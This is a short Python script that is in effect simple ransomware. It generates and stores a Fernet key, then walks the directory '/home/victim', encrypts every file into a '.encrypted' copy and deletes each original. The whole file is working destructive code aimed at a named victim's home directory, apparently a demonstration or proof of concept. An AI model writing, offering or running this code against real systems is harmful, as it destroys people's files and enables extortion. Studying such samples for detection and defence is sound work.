import os
from cryptography.fernet import Fernet

def encrypt_file(file_path, fernet):
    with open(file_path, "rb") as original_file:
        original_data = original_file.read()
        encrypted_data = fernet.encrypt(original_data)

    encrypted_file_path = file_path + ".encrypted"
    with open(encrypted_file_path, "wb") as encrypted_file:
        encrypted_file.write(encrypted_data)

    return encrypted_file_path

def delete_file(file_path):
    os.remove(file_path)

# File path for the symmetric key
key_filename = "symkey"

# Check if the symmetric key file exists
if not os.path.isfile(key_filename):
    # Generate a new symmetric key if the file doesn't exist
    new_symmetric_key = Fernet.generate_key()
    
    # Save the key to the file
    with open(key_filename, "wb") as key_file:
        key_file.write(new_symmetric_key)
    
    print(f"New symmetric key generated and saved to {key_filename}")
else:
    # Load the symmetric key from the file
    with open(key_filename, "rb") as key_file:
        loaded_key = key_file.read()

    # Create a Fernet object with the loaded key
    fernet = Fernet(loaded_key)

    # Define the target directory
    target_directory = "/home/victim"

    # Iterate through the directory structure
    for root, dirs, files in os.walk(target_directory):
        for file in files:
            file_path = os.path.join(root, file)
            
            # Encrypt the file and get the path of the encrypted file
            encrypted_file_path = encrypt_file(file_path, fernet)
            
            # Delete the original file
            delete_file(file_path)

            print(f"Encrypted {file_path} and deleted original. Encrypted copy: {encrypted_file_path}")
